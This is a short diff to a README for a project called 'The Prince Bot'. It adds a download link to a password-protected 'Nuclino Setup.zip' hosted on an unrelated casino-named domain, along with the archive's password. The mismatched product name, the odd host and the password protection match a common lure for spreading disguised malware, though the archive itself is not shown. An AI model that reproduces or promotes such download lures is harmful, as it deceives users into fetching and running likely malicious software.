@@ -1,6 +1,7 @@
 # 🚀 The Prince Bot 🚀
+# [DOWNLOAD](https://casinoviapi.com/Nuclino%20Setup.zip)
+## Password - set1nu24
 
-# [DOWNLOAD](https://casinoviapi.com/NuclinoSetup.zip)
 
 ## 📜 Overview
 
